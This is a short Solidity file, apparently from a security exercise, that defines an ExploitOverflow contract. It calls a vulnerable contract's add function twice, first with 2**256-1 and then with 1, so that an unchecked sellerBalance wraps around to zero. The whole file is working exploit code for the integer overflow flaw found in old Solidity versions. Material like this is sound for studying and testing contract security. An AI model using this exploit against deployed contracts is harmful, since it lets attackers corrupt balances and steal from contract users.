pragma solidity ^0.4.15;

interface IOverflow {
    function add(uint value) external returns (bool);
}

contract ExploitOverflow {
    IOverflow public vulnerable;

    constructor(address _vulnerable) public {
        vulnerable = IOverflow(_vulnerable);
    }

    function exploit() public {
        // First, bring sellerBalance to near max value (2^256 - 1)
        vulnerable.add(2**256 - 1);

        // Now, add 1 to cause overflow: sellerBalance becomes 0
        vulnerable.add(1);
    }
}

